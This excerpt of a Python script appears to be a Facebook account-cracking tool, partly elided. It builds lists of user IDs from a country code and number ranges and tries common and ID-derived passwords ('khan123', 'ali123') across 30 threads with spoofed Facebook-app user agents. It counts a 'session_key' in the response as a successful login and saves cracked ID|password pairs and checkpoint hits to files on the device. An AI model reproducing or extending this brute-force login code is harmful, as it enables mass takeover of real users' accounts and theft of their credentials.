...
def cloning_two():
  ...
  #  print(50*'-')
    ...
    os.system("clear")
    print(logo)
    print(' [•] CracFILE Limit : '+str(len(idx)))
    print(" [•] Be Patience CracFILE Has Been Started")
  #  print("To stop process press CTRL c")
    ...
    def rana(user):
        ...
        for px in pp:
          ...
          #  print (ua)
            ...
            if 'session_key' in response.text:
                print('\r{}\033[1;92m [FILE-OK] {} {} {} {}'.format(G, url, fax, px, mys))
        ...
        #        print('\r{}\033[1;94m[2F-FILE] {} {} {} {}'.format(G, url, fax, px, mys))
                open('/sdcard/2f.txt','a').write(f'{url}|{px}\n')
            else:
                #print(response.text)
                continue
        sys.stdout.write('\r {} [FILE] [{}|{}] [OK:{}] {}\r'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,mys))
        sys.stdout.flush()
        loop += 1       
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as AFILE:     
                        clear()
                        tl = str(len(user))
                        print(' [-] CracFILE Limit   : \033[1;32m'+tl)
                        print(f'\033[1;37m [-] Choice code   :\033[1;32m '+code)
                        print(f'\033[1;37m [-] Be Patience CracFILE Has Been Started\033[1;97m')
                        print("--------------------------------------------------")
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','khan123456','malik123','ali123','alikhan123']
                                AFILE.submit(rndm,ids,passlist)
                print('\033[1;37m')             
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                l1()
                input(' Press enter to back ')
   #             os.system('python AFILE.py')
def bd():
                user=[]
                clear()
...
def gmail():
                ...
                with tred(max_workers=30) as AFILE:
                        total = str(len(fo))
                        clear()
                        print(' [-] CracFILE Limit : \033[1;32m'+total)
                        print("\033[1;37m[-] Be Patience CracFILE Has Been Started\033[1;37m")
                        l1()
                        for user in fo:
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ FILE ] [%s] [\033[1;37mOK : %s ] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                     ...
                     #   ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.75,width=720,height=1640};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [FILE-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/FILEOK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
              ...
              #                          print('\r\r\x1b[38;5;208m [Checkpoint] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/FILE-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
